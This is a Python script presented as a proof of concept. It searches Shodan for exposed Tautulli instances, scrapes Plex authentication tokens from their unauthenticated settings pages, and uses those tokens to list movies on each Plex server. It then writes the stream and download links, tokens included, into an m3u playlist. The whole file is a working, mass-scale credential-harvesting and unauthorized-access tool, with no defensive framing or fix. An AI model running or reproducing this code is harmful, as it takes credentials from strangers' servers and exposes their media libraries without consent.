######################################################################
# PoC for exploit plex mediacenters vuln.
# This script get the plex mediacenters token and use it
#to get the movies and give you the link to view or download them.
######################################################################
# INSTALL
#pip install colorama
#pip install shodan
#pip install bs4
######################################################################
import shodan

import bs4
from bs4 import BeautifulSoup
import requests

import subprocess
from subprocess import call

import colorama
from colorama import Fore, Back, Style

import os

SHODAN_API_KEY = "xxxxxxxxAPI KEY HERE xxxxxxxx"
api = shodan.Shodan(SHODAN_API_KEY)

def main():
    flex_servers_arr = []
    tokens_dic = [[],[]]
    sections_dic = [[],[],[]]
    film_links_dic = [[],[]]

    print(Fore.GREEN + '[+] getting plex servers from shodan... ' + Style.RESET_ALL)
    flex_servers_arr = api.search('CherryPy/5.1.0 /home')
    print(Back.GREEN + '[+] Results found: {}'.format(flex_servers_arr['total']) + Style.RESET_ALL)

    print(Fore.GREEN + '[+] Trying to get the tokens' + Style.RESET_ALL)

    for result in flex_servers_arr['matches']:
        try:
            url ='http://'+ result['ip_str'] +':8181/settings#tab_tabs-plex_media_server'
            r = requests.get(url)
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.find('input', {'id': 'pms_token'}).get('value')
            tokens_dic[0].append(result['ip_str'])
            tokens_dic[1].append(token)
        except :
            print(Fore.YELLOW + '[w] No tokens found for '+ url + Style.RESET_ALL)
    print(Back.GREEN + '[+] Tokens found:  ' + str(len(tokens_dic[1])) + Style.RESET_ALL)

    print(Fore.GREEN + '[+] Trying to get the movie sections' + Style.RESET_ALL)
    for x in range(len(tokens_dic[0])):
        try:
            TautulliUrl = 'http://'+ tokens_dic[0][x] +':32400/library/sections/?X-Plex-Token='+ tokens_dic[1][x]
            Tautullir  = requests.get(TautulliUrl)
            soup = BeautifulSoup(Tautullir.text, features="xml")
            sections = soup.findAll('Directory', {'type': 'movie','language':'es'})
            for section in sections:
                sections_dic[0].append(tokens_dic[0][x])
                sections_dic[1].append(tokens_dic[1][x])
                sections_dic[2].append(section['key'])
        except:
            print(Fore.YELLOW + '[w] No sections found for ' + TautulliUrl + Style.RESET_ALL)
    print(Fore.GREEN + '[+] printing the tokens and movie sections' + Style.RESET_ALL)

    print(Fore.GREEN + '[+] Finding titles' + Style.RESET_ALL)
    for x in range(len(sections_dic[0])):
        try:
            filmListUrl = 'http://'+ sections_dic[0][x] +':32400/library/sections/'+ sections_dic[2][x] +'/all?X-Plex-Token='+ sections_dic[1][x]
            filmr  = requests.get(filmListUrl)
            soup = BeautifulSoup(filmr.text, features="xml")
            films = soup.findAll('MediaContainer')
            for film in films:
                videos = film('Video')
                for video in videos:
                    film_links_dic[0].append(video['title'])
                    film_links_dic[1].append('http://'+ sections_dic[0][x]  +':32400'+ video.find('Part').get('key') +'?X-Plex-Token='+ sections_dic[1][x])
        except:
            print(Fore.YELLOW + '[w] No titles list for '+ filmListUrl + Style.RESET_ALL)

    print(Back.GREEN + '[+] Films found:  ' + str(len(film_links_dic[0])) + Style.RESET_ALL)
    print(Fore.GREEN + '[+] Creating a new m3u file ' + Style.RESET_ALL)

    try:
        os.remove('film_list.m3u')
    except OSError:
        pass

    file = open('film_list.m3u','a')
    file.write('#EXTM3U\n')
    for x in range(len(film_links_dic[0])):
        file.write('#EXTINF:-1,' + film_links_dic[0][x] + '\n')
        file.write(film_links_dic[1][x] + '\n')
    file.close()

    return 0

if __name__ == '__main__':
    main()
